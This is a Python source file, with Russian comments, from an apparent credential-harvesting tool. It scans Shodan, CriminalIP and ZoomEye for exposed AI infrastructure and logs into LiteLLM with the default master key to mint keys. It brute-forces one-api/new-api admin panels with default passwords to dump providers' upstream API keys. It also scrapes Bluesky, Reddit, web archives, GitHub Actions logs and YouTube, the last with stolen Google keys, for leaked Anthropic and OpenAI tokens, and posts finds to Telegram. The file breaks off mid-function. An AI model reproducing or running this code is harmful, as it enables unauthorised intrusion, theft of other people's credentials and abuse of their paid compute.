                r = _get("/api/tags")
                if r is None:
                    dead[0] = True
                elif r.status_code == 200:
                    models = [
                        m.get("name", "?") for m in (r.json().get("models") or [])
                    ]
                    return True, self._rec(
                        addr,
                        kind,
                        "Ollama OPEN (free GPU): %s" % ", ".join(models[:8]),
                        models,
                        scheme=scheme,
                    )
            elif kind in ("vllm", "openwebui", "fastchat", "dify", "newapi"):
                r = _get("/v1/models")
                if r is None:
                    dead[0] = True
                elif r.status_code == 200:
                    data = r.json().get("data") or []
                    models = [m.get("id", "?") for m in data if isinstance(m, dict)]
                    if models:
                        return True, self._rec(
                            addr,
                            kind,
                            "%s OPEN /v1/models: %s" % (kind, ", ".join(models[:8])),
                            models,
                            scheme=scheme,
                        )
            elif kind == "litellm":
                models = []
                r = _get("/v1/models")
                if r is None:
                    dead[0] = True
                elif r.status_code == 200:
                    data = r.json().get("data") or []
                    models = [m.get("id", "?") for m in data if isinstance(m, dict)]
                # АНТИ-ФЕЙК: реальный LiteLLM 400-ит на неизвестную модель,
                # фейк-фермы отвечают 200 canned-текстом на ВСЁ подряд
                try:
                    rb = requests.post(
                        base + "/v1/chat/completions",
                        headers=dict(UA, Authorization="Bearer sk-1234"),
                        json={
                            "model": "kh-bogus-model-zzz-000",
                            "max_tokens": 4,
                            "messages": [{"role": "user", "content": "hi"}],
                        },
                        timeout=(4, 8),
                        verify=False,
                    )
                    if (
                        rb is not None
                        and rb.status_code == 200
                        and '"choices"' in (rb.text or "")
                    ):
                        return True, None  # фейк-ферма — пропускаем
                except Exception:
                    pass
                # классика мисконфига: дефолтный master_key sk-1234
                try:
                    r2 = requests.post(
                        base + "/key/generate",
                        headers=dict(UA, Authorization="Bearer sk-1234"),
                        json={"duration": "30d"},
                        timeout=(5, 10),
                        verify=False,
                    )
                    if r2.status_code == 200 and str(
                        r2.json().get("key") or ""
                    ).startswith("sk-"):
                        return True, self._rec(
                            addr,
                            kind,
                            "LiteLLM DEFAULT MASTER sk-1234 -> ключ сгенерён!",
                            models,
                            r2.json()["key"],
                            scheme=scheme,
                        )
                except Exception:
                    pass
                if models:
                    return True, self._rec(
                        addr, kind, "LiteLLM OPEN /v1/models", models, scheme=scheme
                    )
            elif kind == "jupyter":
                r = _get("/api")
                if r is None:
                    dead[0] = True
                elif r.status_code == 200:
                    return True, self._rec(
                        addr,
                        kind,
                        "Jupyter OPEN (RCE: /terminals + /api/contents)",
                        [],
                        scheme=scheme,
                    )
            elif kind == "ray":
                r = _get("/api/jobs/")
                if r is None:
                    dead[0] = True
                elif r.status_code == 200:
                    return True, self._rec(
                        addr,
                        kind,
                        "Ray Dashboard OPEN (RCE: job submission)",
                        [],
                        scheme=scheme,
                    )
            elif kind == "comfyui":
                r = _get("/system_stats")
                if r is None:
                    dead[0] = True
                elif r.status_code == 200:
                    return True, self._rec(
                        addr,
                        kind,
                        "ComfyUI OPEN (free GPU imagegen)",
                        [],
                        scheme=scheme,
                    )
            elif kind == "mlflow":
                r = _get("/api/2.0/mlflow/experiments/list")
                if r is None:
                    dead[0] = True
                elif r.status_code == 200:
                    return True, self._rec(
                        addr,
                        kind,
                        "MLflow OPEN (experiments/datasets)",
                        [],
                        scheme=scheme,
                    )
            elif kind == "databricks":
                r = _get("/api/2.0/clusters/list")
                if r is None:
                    dead[0] = True
                elif r.status_code == 200:
                    return True, self._rec(
                        addr, kind, "Databricks OPEN workspace", [], scheme=scheme
                    )
            elif kind == "gradio":
                r = _get("/info")
                if r is None:
                    dead[0] = True
                elif r.status_code == 200:
                    return True, self._rec(
                        addr, kind, "Gradio OPEN app", [], scheme=scheme
                    )
        except Exception:
            return False, None
        return (not dead[0]), None

    def fetch(self):
        # живой пул с фолбэком (было: keys[0] — сдох = источник молчит весь цикл)
        keys = Shodan()._alive_pool(Shodan()._key_pool())
        if not keys:
            return []
        out = []
        _oi_skip = {}  # счётчик тихих скипов постинга по kind
        _oi_batch = {}  # kind -> [rec] — сводный пост вместо N подряд
        cyc = int(time.time() // 600)
        start = (cyc * self.PER_CYCLE) % len(self.QUERIES)
        qbatch = [
            self.QUERIES[(start + i) % len(self.QUERIES)] for i in range(self.PER_CYCLE)
        ]
        known_path = os.path.join(HERE, "open_infra_known.json")
        try:
            known = json.load(open(known_path, encoding="utf-8"))
        except Exception:
            known = {}
        # ПРУНИНГ + НЕГАТИВНЫЙ КЭШ: позитивы живут 30д, негативы (трупы) 3д.
        # Раньше негативы не писались вообще — мёртвые хосты перепроверялись
        # каждые ~30 минут вечно (и есть причина затухания источника).
        _now = time.time()
        known = {
            k: v
            for k, v in known.items()
            if _now - (v.get("ts") or 0)
            < (3 * 86400 if k.startswith("neg:") else 30 * 86400)
        }
        for q, kind in qbatch:
            page = (cyc % 5) + 1
            r = None
            for sk in keys:
                try:
                    r = requests.get(
                        "https://api.shodan.io/shodan/host/search",
                        params={"key": sk, "query": q, "page": page},
                        timeout=(10, 25),
                        verify=False,
                    )
                    if r.status_code == 429:
                        time.sleep(3)
                        r = None
                        continue
                    if r.status_code != 200:
                        r = None
                    break
                except Exception:
                    r = None
                    break
            if r is None:
                continue
            try:
                targets = []
                for m in (r.json().get("matches") or [])[:40]:
                    addr = "%s:%s" % (m.get("ip_str"), m.get("port"))
                    okey = "open-infra:%s:%s" % (kind, addr)
                    if okey not in known and ("neg:" + okey) not in known:
                        targets.append(addr)
                with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
                    for addr, res in zip(
                        targets, ex.map(lambda a: self._probe(a, kind), targets)
                    ):
                        if not res:
                            # негативный кэш: труп помечаем, 3 дня не дёргаем
                            known["neg:open-infra:%s:%s" % (kind, addr)] = {
                                "ts": time.time()
                            }
                            continue
                        known[res["origin"]] = {"ts": time.time(), "tier": res["tier"]}
                        store(res)
                        out.append((json.dumps(res, ensure_ascii=False), res["origin"]))
                        log(
                            "  🆓 OPEN-INFRA [%s] %s — %s"
                            % (kind, res["base"], res["tier"])
                        )
                        # ФИЛЬТР TG-СПАМА: постим только хосты с фронтир-моделями
                        # (opus/gpt-5.x/glm-5.3/deepseek-v4/kimi...) или RCE-классы
                        # (jupyter/ray = шеллы). dify с gpt-3.5/4o-mini — не сорим.
                        star_hit = bool(STAR_RE.search(res.get("tier") or "")) or any(
                            STAR_RE.search(str(m))
                            for m in (res.get("models") or [])[:60]
                        )
                        rce_kind = kind in ("jupyter", "ray")
                        if star_hit or rce_kind:
                            # МАСТЕР-КЛЮЧИ litellm — индивидуальные посты
                            # (это алмазы). Остальное — в БАТЧ: одно сводное
                            # сообщение на kind за fetch (было: 8 постов подряд
                            # от одного ray-забега = TG-спам).
                            if kind == "litellm" and str(
                                res.get("key") or ""
                            ).startswith("sk-"):
                                try:
                                    post_telegram(
                                        "🆓 OPEN-INFRA [%s]\n🌐 %s\n%s"
                                        % (kind, res["base"], res["tier"])
                                    )
                                except Exception:
                                    pass
                            else:
                                _oi_batch.setdefault(kind, []).append(res)
                        else:
                            # тихий скип: один счётчик на цикл вместо
                            # 40 одинаковых строк в логе
                            _oi_skip[kind] = _oi_skip.get(kind, 0) + 1
            except Exception:
                continue
        try:
            _atomic_json_dump(known_path, known)
        except Exception:
            pass
        if _oi_skip:
            log(
                "  [open-infra] тихо скипнуто постинга (не фронтир): %s"
                % ", ".join("%s x%d" % kv for kv in sorted(_oi_skip.items()))
            )
        # батч-постинг: одно сводное сообщение на kind (анти-спам ray/jupyter)
        for kind, items in _oi_batch.items():
            try:
                hosts = "\n".join("🌐 %s" % x["base"] for x in items[:8])
                post_telegram("🆓 OPEN-INFRA [%s] x%d\n%s" % (kind, len(items), hosts))
            except Exception:
                pass
        return out


class CriminalIP(Source):
    """CriminalIP banner search — иное покрытие чем Shodan (сильнее по .cn/.kr).
    Ключ: criminalip_key в конфиге (free tier ~1000 кредитов/мес)."""

    name = "criminalip"

    QUERIES = (
        '"sk-ant-oat01"',
        '"sk-ant-api03"',
        '"sk-proj-"',
        '"setup_token"',
        '"OPENAI_API_KEY"',
        '"claudeAiOauth"',
        '"sk-ant-sid01"',
        '"oauthAccount"',
    )

    def fetch(self):
        key = CFG.get("criminalip_key")
        if not key:
            return []
        out = []
        h = {"x-api-key": key, "Accept": "application/json"}
        for q in self.QUERIES:
            try:
                r = http(
                    "GET",
                    "https://api.criminalip.io/v1/banner/search?query=%s&offset=0"
                    % urlquote(q),
                    timeout=(15, 30),
                    headers=h,
                )
                if r.status_code != 200:
                    continue
                data = r.json().get("data") or {}
                for m in (data.get("result") or [])[:25]:
                    body = str(m.get("banner") or "")
                    if body.strip():
                        out.append(
                            (
                                body,
                                "criminalip:%s:%s"
                                % (
                                    m.get("ip_address", "?"),
                                    m.get("open_port_no", "?"),
                                ),
                            )
                        )
            except Exception:
                continue
        return out


class BlueskySearch(Source):
    """Bluesky public API (без авторизации!): searchPosts — люди постят
    ключи/конфиги прямо в текст. Свежая платформа, никто не вычёсывает."""

    name = "bluesky"

    QUERIES = (
        "sk-ant-api03",
        "sk-ant-oat01",
        "sk-proj-",
        "claudeAiOauth",
        "ANTHROPIC_API_KEY",
        "sk-or-v1-",
    )

    def fetch(self):
        out = []
        for q in self.QUERIES:
            try:
                # bluesky блокирует прокси-IP -> только DIRECT
                r = DIRECT.get(
                    "https://public.api.bsky.app/xrpc/app.bsky.feed.searchPosts?q=%s&limit=25"
                    % urlquote(q),
                    timeout=(8, 15),
                    headers=dict(UA, Accept="application/json"),
                    verify=False,
                )
                if r.status_code != 200:
                    continue
                for post in (r.json().get("posts") or [])[:25]:
                    rec = post.get("record") or {}
                    text = rec.get("text") or ""
                    if text and len(text) > 10:
                        out.append(
                            (
                                text,
                                "bluesky:%s"
                                % (post.get("author", {}).get("handle") or "?"),
                            )
                        )
            except Exception:
                continue
        return out


class ArquivoPT(Source):
    """arquivo.pt — португальский веб-архив с ПОЛНОТЕКСТОВЫМ поиском (публичный API).
    Индексирует веб, который Google выкинул — старые relay-страницы, конфиги, дампы."""

    name = "arquivo"

    QUERIES = (
        "sk-ant-oat01",
        "sk-ant-api03",
        "claudeAiOauth",
        "setup_token",
        "sk-ant-sid01",
        "sk-proj-",
        "ANTHROPIC_API_KEY",
    )

    def fetch(self):
        out = []
        for q in self.QUERIES:
            try:
                r = http(
                    "GET",
                    "https://arquivo.pt/textsearch?q=%s&maxItems=20&prettyPrint=false"
                    % urlquote(q),
                    timeout=(8, 20),
                    headers=dict(UA, Accept="application/json"),
                )
                if r.status_code != 200:
                    continue
                j = r.json()
                for item in (j.get("response_items") or [])[:20]:
                    # 1) сниппет-текст вокруг совпадения
                    t = item.get("text") or ""
                    if t and len(t) > 10:
                        out.append((t, "arquivo:%s" % (item.get("url") or "")[:90]))
                    # 2) полная страница через wayback-эндпоинт arquivo
                    link = item.get("linkToArchive") or ""
                    if link:
                        try:
                            t2, code = fetch_text(link, (6, 15), 400_000)
                            if t2 and code == 200:
                                out.append(
                                    (
                                        t2,
                                        "arquivo-full:%s"
                                        % (item.get("url") or "")[:70],
                                    )
                                )
                        except Exception:
                            continue
            except Exception:
                continue
        return out


class RedditSearch(Source):
    """Reddit публичный search.json: свежие посты с ключами (pushshift покрывает
    историю, это — свежак)."""

    name = "reddit"

    QUERIES = (
        '"sk-ant-api03"',
        '"sk-ant-oat01"',
        '"claudeAiOauth"',
        '"sk-proj-" "free"',
        '"anthropic" "api key" "leak"',
        '"sk-or-v1-"',
    )

    def fetch(self):
        out = []
        for q in self.QUERIES:
            try:
                # reddit жёстко режет датацентровые IP: old.reddit + DIRECT
                r = DIRECT.get(
                    "https://old.reddit.com/search.json?q=%s&sort=new&limit=25"
                    % urlquote(q),
                    timeout=(8, 15),
                    headers=dict(UA, Accept="application/json"),
                    verify=False,
                )
                if r.status_code != 200:
                    continue
                for ch in (r.json().get("data", {}).get("children") or [])[:25]:
                    d = ch.get("data") or {}
                    text = (d.get("selftext") or "") + "\n" + (d.get("title") or "")
                    if len(text) > 30:
                        out.append(
                            (text, "reddit:%s" % (d.get("permalink") or "")[:80])
                        )
            except Exception:
                continue
        return out


class NewApiSweep(Source):
    """🥇 ЖИРНЕЙШИЙ вектор: one-api/new-api/veloera панели с дефолтными
    админками (root:123456 и ко). Залогинились -> GET /api/channel/ =
    АПСТРИМ-КЛЮЧИ ПРОВАЙДЕРОВ (sk-ant-api03, sk-proj-, sk-or-...) — это ключи
    уровня ПРОВАЙДЕРА (opus/fable/gpt-5.6 напрямую), а не юзерские слоты!
    + /api/token/ = юзерские токены панели."""

    name = "newapi-sweep"

    CREDS = (
        ("root", "123456"),
        ("admin", "123456"),
        ("root", "root"),
        ("admin", "admin123"),
        ("admin", "admin"),
        ("root", "admin123"),
        ("root", "12345678"),
        ("admin", "12345678"),
        ("root", "toor"),
        ("admin", "password"),
        ("root", "password"),
        ("admin", "admin888"),
    )
    # анти-спам TG: панель постится раз в 24ч (P1.1)
    CRACKED_STATE_PATH = os.path.join(HERE, "newapi_cracked.json")
    # негативный кэш: хосты, где ВСЕ дефолт-креды мимо, не брутим 24ч
    # (было: ребрут каждый проход ротации = приглашение fail2ban/WAF)
    NEG_STATE_PATH = os.path.join(HERE, "newapi_neg.json")

    def _cracked_state(self):
        try:
            return json.load(open(self.CRACKED_STATE_PATH, encoding="utf-8"))
        except Exception:
            return {}

    def _save_cracked_state(self, st):
        try:
            _atomic_json_dump(self.CRACKED_STATE_PATH, st)
        except Exception:
            pass

    def _neg_state(self):
        try:
            st = json.load(open(self.NEG_STATE_PATH, encoding="utf-8"))
            cut = time.time() - 86400
            return {h: t for h, t in st.items() if t > cut}
        except Exception:
            return {}

    def _save_neg_state(self, st):
        try:
            _atomic_json_dump(self.NEG_STATE_PATH, st)
        except Exception:
            pass

    def _panel_roots(self):
        roots = set()
        try:
            with open(os.path.join(HERE, "relay_boards.json"), encoding="utf-8") as f:
                for r in json.load(f):
                    d = r.get("domain")
                    if d:
                        roots.add("https://" + d.strip("/"))
        except Exception:
            pass
        for kb in KNOWN_BASES:
            m = re.match(r"(https?://[^/]+)", kb)
            if m and "api.anthropic.com" not in kb and "api.openai.com" not in kb:
                roots.add(m.group(1))
        try:
            with open(STORE_PATH, encoding="utf-8") as f:
                for line in f:
                    try:
                        v = json.loads(line)
                    except Exception:
                        continue
                    m = re.match(r"(https?://[^/]+)", v.get("base") or "")
                    if m:
                        roots.add(m.group(1))
        except Exception:
            pass
        # официальные API не трогаем (это не панели)
        roots = sorted(
            r
            for r in roots
            if not re.search(
                r"(anthropic\.com|openai\.com|deepseek\.com|groq\.com|"
                r"googleapis\.com|x\.ai|telegram\.org|github|stripe\.com|"
                r"elevenlabs|voyageai|jina|replicate|together|fireworks|"
                r"perplexity|huggingface|mistral|cohere|nvidia|cerebras|"
                r"supabase|stability|deepgram|runwayml|vercel)",
                r,
            )
        )
        # SELF-HOSTED панели на IP:портах (open-infra/farm залежи) — самые
        # мягкие цели: дефолт-креды там живут чаще, чем на публичных релеях
        ip_roots = set()
        for pth, scheme in (
            (r"C:\Temp\opencode\farm_open.json", "http"),
            (r"C:\Temp\opencode\all_setup_hosts.json", "http"),
        ):
            try:
                for h in json.load(open(pth, encoding="utf-8")):
                    h = str(h)
                    if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", h):
                        ip_roots.add("%s://%s" % (scheme, h))
            except Exception:
                continue
        return roots + sorted(ip_roots)

    def fetch(self):
        out = []
        roots = self._panel_roots()
        # негативный кэш: отфильтровываем недавно отбрутленные
        neg = self._neg_state()
        if neg:
            roots = [r for r in roots if r not in neg]
        # ротация: 60 корней за цикл (IP:port-панели короткоживущие — темп важен)
        rot = int(time.time() // 600)
        per = 60
        if len(roots) > per:
            start = (rot * per) % len(roots)
            roots = [roots[(start + i) % len(roots)] for i in range(per)]
        _neg_new = []  # потокобезопасно: crack() отдаёт негативы наружу

        def _normalize_items(j):
            """data бывает списком ИЛИ {"items":[...]} — форки one-api разные
            (P1.1). Multi-key каналы "sk-a,sk-b" сплитятся экстрактором по
            запятой автоматически (запятая не входит в char-class регекса)."""
            data = (j or {}).get("data")
            if isinstance(data, dict):
                data = data.get("items") or data.get("records") or data.get("list")
            if not isinstance(data, list):
                return []
            return data

        def crack(root):
            found = []
            # P1.1: https фейл (TLS-ошибка/кривой шлюз) -> retry по http://
            bases = [root]
            if root.startswith("https://"):
                bases.append("http://" + root[len("https://") :])
            sess = requests.Session()
            sess.verify = False
            sess.trust_env = False
            sess.headers.update(
                {
                    "User-Agent": UA["User-Agent"],
                    "Content-Type": "application/json",
                }
            )
            base = None
            for b in bases:
                for u, p in self.CREDS:
                    try:
                        r = sess.post(
                            b + "/api/user/login",
                            json={"username": u, "password": p},
                            timeout=(5, 10),
                        )
                        if r.status_code != 200:
                            continue
                        j = r.json()
                        if not j.get("success"):
                            continue
                        try:
                            role = int((j.get("data") or {}).get("role") or 0)
                        except Exception:
                            role = 0
                        # success=true но role<10 — юзер без доступа к каналам:
                        # дальше не продолжаем (P1.1), админ/root только
                        if role >= 10:
                            base = b
                        break
                    except Exception:
                        continue
                if base:
                    break
            if not base:
                _neg_new.append(root)  # все креды мимо — 24ч не брутим
                return found
            cracked = False
            # /api/channel/ — АПСТРИМ-КЛЮЧИ ПРОВАЙДЕРОВ (джекпот!)
            # пагинация до пустой страницы (было: p=0,1 — панели с 200+
            # каналами отдавали только первые 200 апстрим-ключей)
            all_ch = []
            for p0 in range(5):
                try:
                    r = sess.get(
                        base + "/api/channel/?p=%s&size=100" % p0, timeout=(6, 12)
                    )
                    if r.status_code != 200:
                        break
                    items = _normalize_items(r.json())
                    if not items:
                        break
                    all_ch.extend(items)
                except Exception:
                    break
            if all_ch:
                txt = json.dumps(all_ch, ensure_ascii=False)
                if any(m in txt for m in ("sk-", "AIza", "gsk_", "hf_", "xai-")):
                    found.append((txt, "newapi-channels:%s" % base))
                    log("  🥇 ПАНЕЛЬ ВСКРЫТА (channels x%d): %s" % (len(all_ch), base))
                    cracked = True
            # /api/token/ — юзерские токены панели (та же пагинация)
            all_tk = []
            for p0 in range(3):
                try:
                    r = sess.get(
                        base + "/api/token/?p=%s&size=100" % p0, timeout=(6, 12)
                    )
                    if r.status_code != 200:
                        break
                    items = _normalize_items(r.json())
                    if not items:
                        break
                    all_tk.extend(items)
                except Exception:
                    break
            if all_tk:
                txt = json.dumps(all_tk, ensure_ascii=False)
                if "sk-" in txt:
                    found.append((txt, "newapi-tokens:%s" % base))
                    cracked = True
            if cracked:
                # джекпот не ждёт пайплайна — прямой TG-пост (P1.1), раз в 24ч
                try:
                    # АУДИТ-фикс: read-modify-write из 18 воркеров без лока
                    # — две панели в одно окно теряли одну запись (дубль-посты)
                    with LOCK:
                        st = self._cracked_state()
                        _fresh = time.time() - float(st.get(base, 0) or 0) > 86400
                        if _fresh:
                            st[base] = time.time()
                            self._save_cracked_state(st)
                    if _fresh:
                        preview = re.findall(
                            r"sk-[A-Za-z0-9_\-]{20,}",
                            " ".join(t for t, _ in found),
                        )[:5]
                        post_telegram(
                            "🥇 NEW-API ПАНЕЛЬ ВСКРЫТА: %s\nключи: %s\n(полный дамп идёт в пайплайн)"
                            % (base, ", ".join(preview) or "см. стор")
                        )
                except Exception:
                    pass
            return found

        with concurrent.futures.ThreadPoolExecutor(max_workers=18) as ex:
            for res in ex.map(crack, roots):
                out.extend(res)
        # сейв негативного кэша (хосты, где все дефолт-креды мимо — 24ч тишина)
        if _neg_new:
            try:
                st = self._neg_state()
                for r0 in _neg_new:
                    st[r0] = time.time()
                self._save_neg_state(st)
            except Exception:
                pass
        if out:
            log("  [newapi-sweep] %d панелей вскрыто!" % (len(out) // 2 or 1))
        return out


class GHActionsLogs(Source):
    """GitHub Actions CI-логи: Claude Code гоняют в CI с CLAUDE_CODE_OAUTH_TOKEN —
    токены палятся в логах (set -x / env-дампы / debug). Публичные ран-логи
    скачиваются с токеном как zip. Свежее и почти не вычесанное место."""

    name = "gh-actions"

    QUERIES = (
        '"CLAUDE_CODE_OAUTH_TOKEN" path:.github/workflows',
        '"claude-code-action"',
        '"claude_code_oauth_token"',
        '"ANTHROPIC_API_KEY" path:.github/workflows',
        '"claudeai" "actions" "oauth"',
    )

    def fetch(self):
        tok = gh_token()
        if not tok:
            return []
        import io as _io
        import zipfile

        out = []
        headers = {
            "Accept": "application/vnd.github+json",
            "Authorization": "Bearer " + tok,
        }
        repos = set()
        for q in self.QUERIES:
            try:
                r = http(
                    "GET",
                    "https://api.github.com/search/code?q=%s&per_page=15" % urlquote(q),
                    timeout=(8, 15),
                    headers=headers,
                )
                if r.status_code != 200:
                    continue
                for it in r.json().get("items") or []:
                    repo = (it.get("repository") or {}).get("full_name")
                    if repo:
                        repos.add(repo)
            except Exception:
                continue
        repos = list(repos)[:30]  # P1.5: было 20

        # персистентный дедуп ранов (было: одни и те же zip-логи качались
        # каждый цикл, пока ран не уезжал из топ-3 окна — жгли квоту впустую)
        _seen_path = os.path.join(HERE, "gh_actions_seen.json")
        try:
            _run_seen = json.load(open(_seen_path, encoding="utf-8"))
        except Exception:
            _run_seen = {}
        _cut = time.time() - 3 * 86400  # TTL 3д: старые ран-ids выметаем
        _run_seen = {k: t for k, t in _run_seen.items() if t > _cut}

        run_ids = []
        for repo in repos:
            try:
                # failure-first: в упавших ранах set -x/env-дампы палят токены
                r = http(
                    "GET",
                    "https://api.github.com/repos/%s/actions/runs?per_page=5&status=failure"
                    % repo,
                    timeout=(8, 15),
                    headers=headers,
                )
                if r.status_code != 200:
                    continue
                for run in r.json().get("workflow_runs") or []:
                    rid = run.get("id")
                    if rid and str(rid) not in _run_seen:
                        run_ids.append((repo, rid))
            except Exception:
                continue

        def dl_logs(repo, rid):
            texts = []
            try:
                r = requests.get(
                    "https://api.github.com/repos/%s/actions/runs/%s/logs"
                    % (repo, rid),
                    headers=headers,
                    timeout=(10, 40),
                )
                if r.status_code != 200 or not r.content:
                    return texts
                _run_seen[str(rid)] = time.time()  # скачан — больше не тянем
                zf = zipfile.ZipFile(_io.BytesIO(r.content))
                # сначала текстовые job-логи, потом остальное (было: первые 40
                # имён — секреты в поздних job'ах терялись)
                names = zf.namelist()
                names.sort(key=lambda n: 0 if n.endswith((".txt", ".log")) else 1)
                for name in names[:80]:
                    try:
                        t = zf.read(name).decode("utf-8", "replace")
                    except Exception:
                        continue
                    if any(
                        m in t
                        for m in (
                            "sk-ant",
                            "oat01",
                            "ort01",
                            "claudeAiOauth",
                            "sessionKey",
                            "ANTHROPIC",
                            "sk-proj-",
                        )
                    ):
                        texts.append((t, "gh-actions:%s#%s" % (repo, rid)))
            except Exception:
                pass
            return texts

        with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
            for texts in ex.map(lambda rr: dl_logs(*rr), run_ids[:60]):
                out.extend(texts)
        try:
            _atomic_json_dump(_seen_path, _run_seen)
        except Exception:
            pass
        if out:
            log("  [gh-actions] %d логов с токенами" % len(out))
        return out


class ZoomEye(Source):
    """ZoomEye: китайский Shodan — ДРУГОЕ покрытие (много CN-релеев/new-api
    панелей, которых нет в Shodan). Ключ: zoomeye_key в конфиге (уже задан).
    P0.2: api.zoomeye.org отдаёт 403 "use api.zoomeye.ai" (регион-блок) ->
    переключаемся на .ai до конца цикла; 502 от .ai -> retry x2 c паузой 20с;
    оба лежат -> zoomeye_state.json down_until=+30мин и тихий skip."""

    name = "zoomeye"
    STATE_PATH = os.path.join(HERE, "zoomeye_state.json")

    QUERIES = (
        '"sk-ant-oat01"',
        '"sk-ant-api03"',
        '"setup_token"',
        '"sk-proj-"',
        '"OPENAI_API_KEY"',
        '"new-api"',
        '"one-api"',
        '"claudeAiOauth"',
        '"sk-ant-sid01"',
        '"oauthAccount"',
    )

    def _state(self):
        try:
            return json.load(open(self.STATE_PATH, encoding="utf-8"))
        except Exception:
            return {}

    def _save_state(self, st):
        try:
            _atomic_json_dump(self.STATE_PATH, st)
        except Exception:
            pass

    def fetch(self):
        key = CFG.get("zoomeye_key")
        if not key:
            return []
        st = self._state()
        down_until = float(st.get("down_until") or 0)
        if time.time() < down_until:
            log(
                "  [zoomeye] skip: API в дауне до %s (+30мин от последнего 502)"
                % time.strftime("%H:%M", time.localtime(down_until))
            )
            return []
        out = []
        h = {"API-KEY": key, "Accept": "application/json"}
        # стартовый хост: запомненный .ai (регион-блок липкий) или .org
        host = "api.zoomeye.ai" if st.get("host") == "ai" else "api.zoomeye.org"
        for q in self.QUERIES:
            final = None  # итоговый статус по запросу после ретраев
            r = None
            for attempt in range(3):  # 502: retry x2 с паузой 20с
                try:
                    r = http(
                        "GET",
                        "https://%s/host/search?query=%s&page=1" % (host, urlquote(q)),
                        timeout=(12, 25),
                        headers=h,
                    )
                except Exception:
                    final = "net"
                    break
                code = r.status_code
                if (
                    code == 403
                    and "zoomeye.ai" in (r.text or "")
                    and host != "api.zoomeye.ai"
                ):
                    # регион-блок .org — переключаемся на .ai до конца цикла
                    log(
                        "  [zoomeye] .org закрыт (403 region) -> переключаюсь на api.zoomeye.ai"
                    )
                    host = "api.zoomeye.ai"
                    st["host"] = "ai"
                    continue
                if code == 502:
                    final = 502
                    if attempt < 2:
                        time.sleep(20)
                    continue
                final = code
                break
            if final == 502:
                # гейтвей лежит — глушим источник на 30 минут, 1 строка в лог
                st["down_until"] = time.time() + 1800
                self._save_state(st)
                log("  [zoomeye] %s 502 x3 (nginx down) — skip 30 минут" % host)
                return out
            if final != 200 or r is None:
                continue
            try:
                for mch in (r.json().get("matches") or [])[:20]:
                    pi = mch.get("portinfo") or {}
                    body = (
                        str(pi.get("banner") or "")
                        + "\n"
                        + str(mch.get("raw_data") or "")
                    )
                    if not body.strip():
                        continue
                    ip = mch.get("ip")
                    if isinstance(ip, list):
                        ip = ip[0] if ip else "?"
                    out.append(
                        (body, "zoomeye:%s:%s" % (ip or "?", pi.get("port", "?")))
                    )
            except Exception:
                continue
        # цикл завершён без дауна — сбрасываем флаги
        st["down_until"] = 0
        self._save_state(st)
        return out


class RelayScanner(Source):
    """Сканирует relay-борды из стора на открытые /api/channel и leaked keys."""

    name = "relay-scanner"

    def fetch(self):
        out = []
        # собираем все relay-домены из стора
        relay_hosts = set()
        try:
            with open(STORE_PATH, encoding="utf-8") as f:
                for line in f:
                    try:
                        v = json.loads(line)
                        base = v.get("base") or v.get("base_url", "")
                        if base:
                            # нормализуем до корня
                            root = re.sub(r"(https?://[^/]+).*", r"\1", base)
                            relay_hosts.add(root)
                    except Exception:
                        continue
        except Exception:
            pass

        # добавляем из KNOWN_BASES
        for kb in KNOWN_BASES.keys():
            root = re.sub(r"(https?://[^/]+).*", r"\1", kb)
            relay_hosts.add(root)

        # добавляем relay_boards.json (33 лидерборд-домена)
        try:
            with open(os.path.join(HERE, "relay_boards.json"), encoding="utf-8") as f:
                for r in json.load(f):
                    d = r.get("domain")
                    if d:
                        relay_hosts.add("https://" + d)
        except Exception:
            pass

        relay_hosts = sorted(relay_hosts)
        # ротация окна 80 (было: фиксированные первые 80 — хвост списка
        # никогда не сканировался)
        if len(relay_hosts) > 80:
            _r0 = (int(time.time() // 600) * 80) % len(relay_hosts)
            relay_hosts = (relay_hosts[_r0:] + relay_hosts[:_r0])[:80]

        # пробуем /api/channel, /api/status, /api/token — параллельно
        endpoints = [
            "/api/channel/?p=1",
            "/api/channel/1",
            "/api/token/?p=1",
            "/api/status",
        ]

        tasks = [(h, ep) for h in relay_hosts for ep in endpoints]

        def _probe(host, ep):
            try:
                t, src = fetch_text(host + ep, (4, 8), 500_000)
                if t and ("sk-" in t or "lfu_" in t or "xai-" in t or "gsk_" in t):
                    return (t, "relay-scanner:%s%s" % (host, ep))
            except Exception:
                return None
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
            for res in ex.map(lambda t: _probe(t[0], t[1]), tasks):
                if res:
                    out.append(res)

        return out


# ----------------------------------------------------- UNCONVENTIONAL WAVE
class YouTubeHunt(Source):
    """YouTube Data API — SELF-FEEDING: питается валидными AIzaSy-ключами из
    стора. Туториалы и их комменты — стабильный источник утёкших ключей
    (авторы постят реальный ключ в описании/комментах). Квота: search=100 ед,
    10k/день на ключ -> гейт 30 мин + ротация до 3 ключей из стора."""

    name = "youtube"
    STATE_PATH = os.path.join(HERE, "youtube_state.json")
    QUERIES = (
        '"sk-ant-api03" api',
        '"sk-proj-" key tutorial',
        "LITELLM_MASTER_KEY",
    )

    def _store_keys(self):
        """До 3 свежих валидных AIzaSy из стора (rotация по 10-мин ведрам)."""
        best = []
        try:
            for line in open(STORE_PATH, encoding="utf-8-sig"):
                line = line.strip()
                if not line or "AIzaSy" not in line:
                    continue
                try:
                    v = json.loads(line)
                except Exception:
                    continue
                if (
                    v.get("tag") == "google"
                    and str(v.get("key", "")).startswith("AIzaSy")
                    and v.get("status") in ("working", "no_balance", "listed_only")
                ):
                    best.append(v)
        except Exception:
            pass
        # свежие сверху, уникальные ключи
        seen = set()
        uniq = []
        for v in sorted(best, key=lambda x: -(x.get("ts") or 0)):
            if v["key"] not in seen:
                seen.add(v["key"])
                uniq.append(v)
        return [v["key"] for v in uniq[:3]]

    def fetch(self):
        keys = self._store_keys()
        if not keys:
            return []
        st = {}
        try:
            st = json.load(open(self.STATE_PATH, encoding="utf-8"))
        except Exception:
            pass
        if time.time() - float(st.get("ts") or 0) < 1800:
            return []  # квота: раз в 30 минут
        api_key = keys[int(st.get("idx") or 0) % len(keys)]
        st = {"ts": time.time(), "idx": (int(st.get("idx") or 0) + 1)}
        try:
            _atomic_json_dump(self.STATE_PATH, st)
        except Exception:
            pass
        out = []
        for q in self.QUERIES:  # все 3 запроса (было: [:2] — LITELLM_MASTER_KEY мёртв)
            try:
                r = http(
                    "GET",
                    "https://www.googleapis.com/youtube/v3/search?q=%s"
                    "&type=video&maxResults=5&part=snippet&key=%s"
